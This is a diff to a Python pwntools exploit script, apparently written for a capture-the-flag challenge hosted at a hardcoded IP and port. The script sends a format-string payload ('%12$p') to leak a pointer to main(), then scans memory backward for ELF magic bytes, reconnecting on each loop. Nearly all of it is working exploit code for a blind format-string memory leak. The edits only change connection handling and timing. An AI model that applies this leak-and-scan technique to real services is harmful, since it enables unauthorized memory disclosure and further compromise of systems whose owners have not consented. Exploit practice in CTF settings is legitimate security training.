@@ -4,7 +4,7 @@ from pwn import *
 from struct import *
 
 ip, port = '178.128.46.49', 32460
-io = remote(ip, port)
+#io = remote(ip, port)
 
 def detect():
         for i in range(64):
@@ -67,7 +67,7 @@ def detect():
 def leak_pointer_to_main():
 	'''12th pointer is one from the main()'''
 	io.sendline(b"%12$p")
-	#sleep(0.2)
+	sleep(0.3)
 	io.recvuntil(b"> ")
 	leak_all = io.recv()
 	leak = leak_all.decode().split("\n")[0]
@@ -92,14 +92,14 @@ def search_elf_magic_bytes(leaked_main,addr):
 			addr -=0x100
 		except:
 			addr -=0x100
-			#io.close()
+			io.close()
 			return addr, True
 
 elf_found = True
 addr = 0
 leaked_main = 0
 while elf_found:
-	#io = remote(ip,port)
+	io = remote(ip,port)
 	print("CURRENT ADDRESS = " + hex(addr))
 	leaked_main = leak_pointer_to_main() + addr
 	addr, elf_found = search_elf_magic_bytes(leaked_main,addr)
